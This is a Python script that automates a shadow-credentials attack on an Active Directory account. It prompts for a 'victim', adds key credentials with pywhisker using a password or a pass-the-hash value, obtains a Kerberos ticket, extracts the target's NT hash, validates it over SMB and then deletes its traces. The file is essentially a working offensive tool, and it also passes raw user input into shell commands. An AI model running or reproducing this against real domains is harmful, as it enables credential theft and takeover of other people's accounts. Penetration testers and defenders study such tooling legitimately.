import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

# Get the arguments from the argument_parser.py
args = parse_arguments()
# Extract arguments
DOMAIN = args.DomainName
USER = args.Username
PASS = args.Password
HASH = args.PassTheHash  

def ACLH():
    tar = input(f"{CYAN}Victim (if machine make sure you put $ at the end (ex pctest001$):{RED} {RESET}")
    subprocess.call([f"pywhisker.py -d {DOMAIN} -u {USER} --hashes :{HASH} --target {tar} --action 'add' -f ACLH | tee -a ACLH.txt"], shell=True)
    with open("ACLH.txt", "r") as f:
        content=f.read()
        print(content)
    subprocess.call([f"cat ACLH.txt | grep -ia password > a.txt"], shell=True)
    subprocess.call([f"cut -d ':' -f 2 a.txt > b.txt"], shell=True)
    subprocess.call([f"cat b.txt | sed 's/ //g' > PFX_PASS.txt"], shell=True)
    with open("PFX_PASS.txt", "r") as f:
        content=f.read()
        print(f"{YELLOW}PFX password is {RED}{content}{RESET}")
        pfx = input(f"{CYAN}PFX Password: {RED} {RESET}")
        print(f"{YELLOW}Running the following (gettgtpkinit.py -cert-pfx ACLH.pfx -pfx-pass {pfx} {DOMAIN}/{tar} ACLH.ccache){RESET}")
        subprocess.call([f"gettgtpkinit.py -cert-pfx ACLH.pfx -pfx-pass {pfx} {DOMAIN}/{tar} ACLH.ccache"], shell=True)
        subprocess.call([f"export KRB5CCNAME=ACLH.ccache"], shell=True)
        subprocess.call([f""], shell=True) 
        os.environ['KRB5CCNAME'] = 'ACLH.ccache'
        key = input(f"{CYAN}AS-Rep Encryption Key (ex:f87eb3548a2313a74458f1506c3ef557a05975a3cdefaa0f106d52243862fce9): {RED} {RESET}")   
        subprocess.call([f"getnthash.py {DOMAIN}/{tar} -key {key} | tee -a a.txt"], shell=True)
        subprocess.call([f"cat a.txt | tail -n 1 > NThash.txt"], shell=True)
        subprocess.call([f"nxc smb {DOMAIN} -u {tar} -H NThash.txt"], shell=True)
        subprocess.call([f"rm -rf ACLH.* a.txt b.txt PFX_PASS.txt"], shell=True)
    
def ACLP():
    tar = input(f"{CYAN}Victim (if machine make sure you put $ at the end (ex pctest001$):{RED} {RESET}")
    subprocess.call([f"pywhisker.py -d {DOMAIN} -u {USER} -p {PASS} --target {tar} --action 'add' -f ACLH | tee -a ACLH.txt"], shell=True)
    with open("ACLH.txt", "r") as f:
        content=f.read()
        print(content)
    subprocess.call([f"cat ACLH.txt | grep -ia password > a.txt"], shell=True)
    subprocess.call([f"cut -d ':' -f 2 a.txt > b.txt"], shell=True)
    subprocess.call([f"cat b.txt | sed 's/ //g' > PFX_PASS.txt"], shell=True)
    with open("PFX_PASS.txt", "r") as f:
        content=f.read()
        print(f"{YELLOW}PFX password is {RED}{content}{RESET}")
        pfx = input(f"{CYAN}PFX Password: {RED} {RESET}")
        print(f"{YELLOW}Running the following (gettgtpkinit.py -cert-pfx ACLH.pfx -pfx-pass {pfx} {DOMAIN}/{tar} ACLH.ccache){RESET}")
        subprocess.call([f"gettgtpkinit.py -cert-pfx ACLH.pfx -pfx-pass {pfx} {DOMAIN}/{tar} ACLH.ccache"], shell=True)
        os.environ['KRB5CCNAME'] = 'ACLH.ccache'
        key = input(f"{CYAN}AS-Rep Encryption Key (ex:f87eb3548a2313a74458f1506c3ef557a05975a3cdefaa0f106d52243862fce9): {RED} {RESET}")   
        subprocess.call([f"getnthash.py {DOMAIN}/{tar} -key {key} | tee -a a.txt"], shell=True)
        subprocess.call([f"cat a.txt | tail -n 1 > NThash.txt"], shell=True)
        subprocess.call([f"nxc smb {DOMAIN} -u {tar} -H NThash.txt"], shell=True)
        subprocess.call([f"rm -rf ACLH.* a.txt b.txt PFX_PASS.txt"], shell=True)

def main():

    # Check if the user input is valid
    if HASH:
        ACLH()
    else:
        ACLP()

if __name__ == '__main__':
    main()
